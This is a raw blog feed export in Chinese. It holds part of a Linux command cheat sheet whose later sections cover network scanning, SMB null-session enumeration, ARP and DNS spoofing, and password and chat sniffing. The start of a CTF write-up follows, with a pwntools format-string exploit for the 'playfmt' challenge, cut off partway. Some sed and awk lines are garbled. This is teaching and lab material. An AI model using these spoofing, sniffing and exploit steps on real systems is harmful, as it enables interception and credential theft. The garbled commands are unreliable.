keyword">for</span> text manipulation using PIPE, STDIN and STDOUT <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">></span> result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中 <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">>></span> result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中 <span class="token function">grep</span> Aug /var/log/messages 在文件 <span class="token string">'/var/log/messages'</span>中查找关键词<span class="token string">"Aug"</span> <span class="token function">grep</span> ^Aug /var/log/messages 在文件 <span class="token string">'/var/log/messages'</span>中查找以<span class="token string">"Aug"</span>开始的词汇 <span class="token function">grep</span> <span class="token punctuation">[</span>0-9<span class="token punctuation">]</span> /var/log/messages 选择 <span class="token string">'/var/log/messages'</span> 文件中所有包含数字的行 <span class="token function">grep</span> Aug -R /var/log/* 在目录 <span class="token string">'/var/log'</span> 及随后的目录中搜索字符串<span class="token string">"Aug"</span> <span class="token function">sed</span> <span class="token string">'s/stringa1/stringa2/g'</span> example.txt 将example.txt文件中的 <span class="token string">"string1"</span> 替换成 <span class="token string">"string2"</span> <span class="token function">sed</span> <span class="token string">'/^/d'</span> example.txt 从example.txt文件中删除所有空白行  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt 从example.txt文件中删除所有空白行  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt 从example.txt文件中删除所有注释和空白行 <span class="token keyword">echo</span> <span class="token string">'esempio'</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span> 合并上下单元格内容 <span class="token function">sed</span> -e <span class="token string">'1d'</span> result.txt 从文件example.txt 中排除第一行 <span class="token function">sed</span> -n <span class="token string">'/stringa1/p'</span> 查看只包含词汇 <span class="token string">"string1"</span>的行 <span class="token function">sed</span> -e <span class="token string">'s/ *//′example.txt删除每一行最后的空白字符sed−e′s/stringa1//g′example.txt从文档中只删除词汇"string1"并保留剩余全部sed−n′1,5p;5q′example.txt查看从第一行到第5行内容sed−n′5p;5q′example.txt查看第5行sed−e′s/00∗/0/g′example.txt用单个零替换多个零cat−nfile1标示文件的行数catexample.txt|awk′NR//′example.txt删除每一行最后的空白字符sed−e′s/stringa1//g′example.txt从文档中只删除词汇"string1"并保留剩余全部sed−n′1,5p;5q′example.txt查看从第一行到第5行内容sed−n′5p;5q′example.txt查看第5行sed−e′s/00∗/0/g′example.txt用单个零替换多个零cat−nfile1标示文件的行数catexample.txt|awk′NR1}'</span> 查看一行第一栏 <span class="token keyword">echo</span> a b c <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print 1,1,3}'</span> 查看一行的第一和第三栏 <span class="token function">paste</span> file1 file2 合并两个文件或两栏的内容 <span class="token function">paste</span> -d <span class="token string">'+'</span> file1 file2 合并两个文件或两栏的内容，中间用<span class="token string">"+"</span>区分 <span class="token function">sort</span> file1 file2 排序两个文件的内容 <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> 取出两个文件的并集<span class="token punctuation">(</span>重复的行只保留一份<span class="token punctuation">)</span> <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -u 删除交集，留下其他的行 <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -d 取出两个文件的交集<span class="token punctuation">(</span>只留下同时存在于两个文件中的文件<span class="token punctuation">)</span> <span class="token function">comm</span> -1 file1 file2 比较两个文件的内容只删除 <span class="token string">'file1'</span> 所包含的内容 <span class="token function">comm</span> -2 file1 file2 比较两个文件的内容只删除 <span class="token string">'file2'</span> 所包含的内容 <span class="token function">comm</span> -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分</code></pre><h2 id="字符设置和文件格式转换"><a href="#字符设置和文件格式转换" class="headerlink" title="字符设置和文件格式转换"></a>字符设置和文件格式转换</h2><pre class=" language-bash"><code class="language-bash">dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS recode <span class="token punctuation">..</span>HTML <span class="token operator">&lt;</span> page.txt <span class="token operator">></span> page.html 将一个文本文件转换成html recode -l <span class="token operator">|</span> <span class="token function">more</span> 显示所有允许的转换格式</code></pre><h2 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h2><pre class=" language-bash"><code class="language-bash">badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块 <span class="token function">fsck</span> /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性 fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性 fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</code></pre><h2 id="初始化一个文件系统"><a href="#初始化一个文件系统" class="headerlink" title="初始化一个文件系统"></a>初始化一个文件系统</h2><pre class=" language-bash"><code class="language-bash"> mkfs /dev/hda1 在hda1分区创建一个文件系统 mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统 mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3<span class="token punctuation">(</span>日志型<span class="token punctuation">)</span>的文件系统 mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统 <span class="token function">fdformat</span> -n /dev/fd0 格式化一个软盘 mkswap /dev/hda3 创建一个swap文件系统SWAP文件系统 mkswap /dev/hda3 创建一个swap文件系统 swapon /dev/hda3 启用一个新的swap文件系统 swapon /dev/hda2 /dev/hdb3 启用两个swap分区</code></pre><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><pre class=" language-bash"><code class="language-bash">dump -0aj -f /tmp/home0.bak /home 制作一个 <span class="token string">'/home'</span> 目录的完整备份 dump -1aj -f /tmp/home0.bak /home 制作一个 <span class="token string">'/home'</span> 目录的交互式备份 restore -if /tmp/home0.bak 还原一个交互式备份 <span class="token function">rsync</span> -rogpav --delete /home /tmp 同步两边的目录 <span class="token function">rsync</span> -rogpav -e <span class="token function">ssh</span> --delete /home ip_address:/tmp 通过SSH通道rsync <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录 <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录 <span class="token function">dd</span> bs<span class="token operator">=</span>1M if<span class="token operator">=</span>/dev/hda <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">|</span> <span class="token function">ssh</span> user@ip_addr <span class="token string">'dd of=hda.gz'</span> 通过ssh在远程主机上执行一次备份本地磁盘的操作 <span class="token function">dd</span> if<span class="token operator">=</span>/dev/sda of<span class="token operator">=</span>/tmp/file1 备份磁盘内容到一个文件 <span class="token function">tar</span> -Puf backup.tar /home/user 执行一次对 <span class="token string">'/home/user'</span> 目录的交互式备份操作 <span class="token punctuation">(</span> <span class="token function">cd</span> /tmp/local/ <span class="token operator">&amp;&amp;</span> <span class="token function">tar</span> c <span class="token keyword">.</span> <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/share/ &amp;&amp; tar x -p'</span> 通过ssh在远程目录中复制一个目录内容 <span class="token punctuation">(</span> <span class="token function">tar</span> c /home <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/backup-home &amp;&amp; tar x -p'</span> 通过ssh在远程目录中复制一个本地目录 <span class="token function">tar</span> cf - <span class="token keyword">.</span> <span class="token operator">|</span> <span class="token punctuation">(</span>cd /tmp/backup <span class="token punctuation">;</span> <span class="token function">tar</span> xf - <span class="token punctuation">)</span> 本地将一个目录复制到另一个地方，保留原有权限及链接 <span class="token function">find</span> /home/user1 -name <span class="token string">'*.txt'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">cp</span> -av --target-directory<span class="token operator">=</span>/home/backup/ --parents 从一个目录查找并复制所有以 <span class="token string">'.txt'</span> 结尾的文件到另一个目录 <span class="token function">find</span> /var/log -name <span class="token string">'*.log'</span> <span class="token operator">|</span> <span class="token function">tar</span> cv --files-from<span class="token operator">=</span>- <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token operator">></span> log.tar.bz2 查找所有以 <span class="token string">'.log'</span> 结尾的文件并做成一个bzip包 <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hda of<span class="token operator">=</span>/dev/fd0 bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 做一个将 MBR <span class="token punctuation">(</span>Master Boot Record<span class="token punctuation">)</span>内容复制到软盘的动作 <span class="token function">dd</span> if<span class="token operator">=</span>/dev/fd0 of<span class="token operator">=</span>/dev/hda bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 从已经保存到软盘的备份中恢复MBR内容</code></pre><h2 id="光盘"><a href="#光盘" class="headerlink" title="光盘"></a>光盘</h2><pre class=" language-bash"><code class="language-bash">cdrecord -v gracetime<span class="token operator">=</span>2 dev<span class="token operator">=</span>/dev/cdrom -eject blank<span class="token operator">=</span>fast -force 清空一个可复写的光盘内容 <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">></span> cd.iso 在磁盘上创建一个光盘的iso镜像文件 <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">></span> cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件 <span class="token function">mkisofs</span> -J -allow-leading-dots -R -V <span class="token string">"Label CD"</span> -iso-level 4 -o ./cd.iso data_cd 创建一个目录的iso镜像文件 cdrecord -v dev<span class="token operator">=</span>/dev/cdrom cd.iso 刻录一个ISO镜像文件 <span class="token function">gzip</span> -dc cd_iso.gz <span class="token operator">|</span> cdrecord dev<span class="token operator">=</span>/dev/cdrom - 刻录一个压缩了的ISO镜像文件 <span class="token function">mount</span> -o loop cd.iso /mnt/iso 挂载一个ISO镜像文件 cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中 cd-paranoia -- <span class="token string">"-3"</span> 从一个CD光盘转录音轨到 wav 文件中（参数-3） cdrecord --scanbus 扫描总线以识别scsi通道 <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hdc <span class="token operator">|</span> md5sum 校验一个设备的md5sum编码，例如一张 CD</code></pre><h2 id="应用命令"><a href="#应用命令" class="headerlink" title="应用命令"></a>应用命令</h2><pre class=" language-bash"><code class="language-bash">whois 域名/ip 查看域名的详细信息。<span class="token function">ping</span> 域名/ip 测试本机到远端主机是否联通。<span class="token function">dig</span> 域名/ip 查看域名解析的详细信息。host -l 域名 dns服务器 传输zone。</code></pre><h2 id="扫描nmap"><a href="#扫描nmap" class="headerlink" title="扫描nmap"></a>扫描nmap</h2><pre class=" language-bash"><code class="language-bash">-sS 半开扫描TCP和SYN扫描。-sT 完全TCP连接扫描。-sU UDP扫描-PS syn包探测<span class="token punctuation">(</span>防火墙探测<span class="token punctuation">)</span>-PA ack包探测<span class="token punctuation">(</span>防火墙探测<span class="token punctuation">)</span>-PN 不ping。-n 不dns解析。-A -O和-sV。-O 操作系统识别。-sV 服务版本信息<span class="token punctuation">(</span>banner<span class="token punctuation">)</span>-p 端口扫描。-T 设置时间级别<span class="token punctuation">(</span>0-5<span class="token punctuation">)</span>-iL 导入扫描结果。-oG 输出扫描结果。操作系统识别:p0f -i eth0 -U -p 开启混杂模式。xprobe2 ip<span class="token operator">|</span>域名 检测os。banner获取:nc ip port 检测端口是否打开。telnet ip port 检测端口是否打开。<span class="token function">wget</span> ip 下载主页。<span class="token function">cat</span> index.html <span class="token operator">|</span> <span class="token function">more</span> 显示主页代码。q 退出。windows枚举nmap -sS -p 139,445 ip 扫描windows。<span class="token function">cd</span> /pentest/enumeration/smb-enumnbtscan -f targetIP 检测netbios。smbgetserverinfo -i targetIP 扫描name,os,组。smbdumpusers -i targetIP 列出用户。smbclient -L //targetIP 列出共享。使用windows:net use \\ipipc$ <span class="token string">""</span> /u:<span class="token string">""</span> 开启空会话。net view \\ip 显示共享信息。smbclient:smbclient -L hostName -I targetIP 枚举共享。smbclient -L hostName/share -U <span class="token string">""</span> 用空用户连接。smbclient -L hostName -I targetIP -U admin普通用户连接。rpcclient:rpcclient targetIP -U “”打开一个空会话。netshareenum 枚举共享。enumdomusers 枚举用户。lsaenumsid 枚举域SID。queryuser RID 查询用户信息。createdomuser 创建用户访问。</code></pre><h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><pre class=" language-bash"><code class="language-bash">ettercap:<span class="token function">nano</span> /usr/local/etc/etter.conf配置文件Sniff <span class="token operator">></span> Unified sniffing <span class="token operator">></span> Network interface: eth0 <span class="token operator">></span> OK 设置抓包的网卡Hosts <span class="token operator">></span> Scan <span class="token keyword">for</span> hosts <span class="token punctuation">(</span>do this two times<span class="token punctuation">)</span>扫描网段的主机Hosts <span class="token operator">></span> Hosts list 显示主机列表Select the default gateway <span class="token operator">></span> Add to Target 1 添加主机Select the target <span class="token operator">></span> Add to Target 2 添加主机Mitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK 设置ARP攻击Start <span class="token operator">></span> Start sniffing 开始攻击dsniff -i eth0 监听网卡窃听登录用户密码urlsnarf -i eth0 嗅探http请求msgsnarf -i eth0 嗅探聊天软件的聊天内容driftnet -i eth0 网络管理嗅探图片，音频。dns欺骗:<span class="token function">nano</span> /usr/local/share/ettercap/etter.dns编辑配置文件Plugins <span class="token operator">></span> Manage the plugins <span class="token operator">></span> dns_spoof 设置dns欺骗Mitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK 设置ARPStart <span class="token operator">></span> Start sniffing 开始攻击</code></pre><h2 id="Exploits漏洞利用"><a href="#Exploits漏洞利用" class="headerlink" title="Exploits漏洞利用"></a>Exploits漏洞利用</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /pentest/exploits/exploit-db 进入目录<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i <span class="token punctuation">[</span>exploit<span class="token punctuation">]</span> 查询需要的漏洞<span class="token function">cat</span> exploit <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"#include"</span>检查运行环境<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i exploit <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">" "</span> -f1 <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> sys <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">":"</span> -f1 <span class="token operator">|</span> <span class="token function">sort</span> -u只保留可以在linux下运行的代码Metasploit:svn update 升级./msfweb Web接口127.0.0.1:55555。../msfconsole 字符下的Console。<span class="token function">help</span> 帮助show 显示选项 searc</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux重定向 </tag>
            
            <tag> 常用命令集 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月31-Hitcon-五</title>
      <link href="/2018/10/31/Pwn-10%E6%9C%8831-Hitcon-%E4%BA%94/"/>
      <url>/2018/10/31/Pwn-10%E6%9C%8831-Hitcon-%E4%BA%94/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-十月31-Hitcon-五"><a href="#Pwn-十月31-Hitcon-五" class="headerlink" title="Pwn-十月31-Hitcon-五"></a>Pwn-十月31-Hitcon-五</h1><blockquote><p>鸽了几天之后，继续练习Hitcon😭🆒。</p></blockquote><h2 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9-playfmt"></a>lab9-playfmt</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 同样，这一题也是格式化字符串漏洞，但是这题的格式化字符串不在栈上，而是在全局变量（.bss)段？？？什么情况🙃。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 所以这题我们不能直接通过控制栈上变量来修改Got表，那意思是什么呢？就可以通过间接的方式来修改Got表内容咯。</p></blockquote><h3 id="查看文件信息并且检查保护措施"><a href="#查看文件信息并且检查保护措施" class="headerlink" title="查看文件信息并且检查保护措施"></a>查看文件信息并且检查保护措施</h3><blockquote><p><code>checksec playfmt</code>:</p><p><img src="https://i.loli.net/2018/10/31/5bd9a7693eb66.png" alt=""></p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 简单运行一下程序可以看到，这次的printf函数buf不在栈上，而是在bss段。</p></blockquote><p><img src="https://i.loli.net/2018/10/31/5bd9a9c834154.png" alt=""></p><p>IDA看一看：</p><p><img src="https://i.loli.net/2018/10/31/5bd9ab6a202f0.png" alt=""></p><p>的确是格式化字符串的漏洞，很明显咯。</p><p><img src="https://i.loli.net/2018/10/31/5bd9accfc0a7b.png" alt=""></p><p>用gdb调试，并且输入4个a，可以看到buf不在栈上。</p><blockquote><p> 引用大佬的话：<code>通过修改栈中存在的指针，将其指向栈上的变量，可以间接地实现写got，这种方式是一种常见的套路。</code></p><p> c/c++中的<code>%n</code>是什么意思呢，它是输入格式化控制字符，在这题中可以用于修改栈中变量的值。</p></blockquote><p>我们可以在printf函数处下断点，查看栈中变量情况：</p><p><img src="https://i.loli.net/2018/10/31/5bd9b9c7dc455.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 可以看到偏移量为6的地方是ebp，而ebp指向了另外一个地址，即偏移量为10的地方，然后又指向偏移量为15的位置。这里我们其实可以走一步捷径，通过获得偏移量为8的地方这个函数地址，leak出libc基地址。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 正是因为程序是循环运行，所以给了我们足够多次数来间接覆写GOT表。</p><blockquote><p> 解题逻辑（<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">来自23r3f</a> ）：</p><pre class=" language-python"><code class="language-python"> ebp_1 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printf函数栈中偏移量为<span class="token number">6</span><span class="token punctuation">,</span> 即$ebp ebp_2 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printf函数栈中偏移量为<span class="token number">10</span><span class="token punctuation">,</span> 即$ebp的值地址 fmt_7 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printf函数栈中偏移量为<span class="token number">7</span> fmt_11 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printf函数栈中偏移量为<span class="token number">11</span></code></pre><p> &nbsp; &nbsp; &nbsp; &nbsp; ebp1的内容是指向ebp2的地址的指针，而ebp2的内容又是指向其他地址的指针，因此如果我们用%n对ebp1进行操作，那么实际上会修改ebp2的值，如果此时再把ebp2的内容改成一个指向fmt7的指针，然后在对ebp2进行%n操作，那么就可以改变fmt7的内容，从而实现了间接修改某个地址的内容，试想一下，我们把fmt7的内容又改成printf的got表地址，那么fmt7就指向了printf_got的地址，如果用%s操作，就可以把printf_got的内容打印出来，从而得到了printf函数的真正地址，到了这里，我们就可以通过printf函数泄漏出system的真正地址了。</p><p> 具体思路：</p><pre class=" language-python"><code class="language-python"> <span class="token number">1</span><span class="token punctuation">.</span>通过ebp_1使ebp_2指向fmt_7 <span class="token number">2</span><span class="token punctuation">.</span>通过ebp_2将fmt_7处的内容覆盖成printf_got <span class="token number">3</span><span class="token punctuation">.</span>通过ebp_1使ebp_2指向fmt_11 <span class="token number">4</span><span class="token punctuation">.</span>通过ebp_2将fmt_11处的内容修改成printf_got<span class="token operator">+</span><span class="token number">2</span> <span class="token number">5</span><span class="token punctuation">.</span>通过fmt_7将printf_got地址泄露出来 <span class="token number">6</span><span class="token punctuation">.</span>计算出system函数的地址 <span class="token punctuation">,</span>将system函数地址写入printf在got表的地址 具体做法是将 system函数地址的前两个字节写入fmt_7<span class="token punctuation">,</span>后两个字节写入 fmt_11 <span class="token number">7</span><span class="token punctuation">.</span>执行printf函数相当于执行system函数 <span class="token number">8</span><span class="token punctuation">.</span>输入<span class="token string">"/bin/sh"</span>字符串，让system函数从栈中取参数getshell</code></pre></blockquote><p>接下来直接通过理解各位大佬exp的方式，来深入理解这一道题（太菜了我）。</p><h3 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h3><p>三份大佬EXP各有不同技巧：分别来自M4x，23r3f，veritas501</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>__Auther__ <span class="token operator">=</span> <span class="token string">'M4x'</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Breakpoint *do_fmt+64pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "..%8$p....%6$p."...0x804a06f &lt;buf+15>:    ".11111111"0x804a079 &lt;buf+25>:    ""pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x38252e2e ('..%8')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 ◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'17:005c│      0xffa0781c ◂— 0x0... ↓'''</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *do_fmt+64\nc"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"..%8$p....%6$p..11111111\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc.address -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x28</span>success<span class="token punctuation">(</span><span class="token string">"stack -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%30684c%21$hn%1"...0x804a06f &lt;buf+15>:    "6c%22$hn2222222"...0x804a07e &lt;buf+30>:    "2"pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x36303325 ('%306')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 ◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'17:005c│      0xffa0781c ◂— 0x0... ↓'''</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'22222222\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"11111111"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 